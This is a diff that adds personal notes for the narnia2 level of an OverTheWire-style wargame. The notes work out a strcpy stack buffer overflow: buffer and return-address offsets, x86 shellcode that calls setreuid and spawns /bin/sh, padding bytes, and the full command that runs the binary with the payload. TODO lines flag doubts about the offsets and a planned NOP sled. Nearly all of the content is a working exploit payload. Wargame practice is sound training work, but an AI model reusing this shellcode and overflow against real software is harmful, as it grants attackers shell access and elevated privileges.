@@ -1,0 +1,12 @@
+Return IP should be at 128+4(bp)+4(ip) 136 # TODO No 132
+Buffer ENDS at 0xffffd308 
+Buffer STARTS at 0xffffd288
+Dest pointer to strcpy is 0xffffd288
+source pointer to strcpy is 0xffffd557
+The modified return IP should be 0xffffd288 or in LE \x88\xd2\xff\xff
+Shellcraft code is 58
+Padding 136-58=78 # TODO No 74
+b'j1X\xcd\x80\x89\xc3jFX\x89\xd9\xcd\x80jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x04\xd2\xff\xff'
+./narnia2 "$(printf 'j1X\xcd\x80\x89\xc3jFX\x89\xd9\xcd\x80jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x08\xd2\xff\xff')"
+
+TODO The address we want to return to is on the stack and it seems to very depending on if the program is started directly or via gdb.  Confirm this and use the nop-sleigh instead.
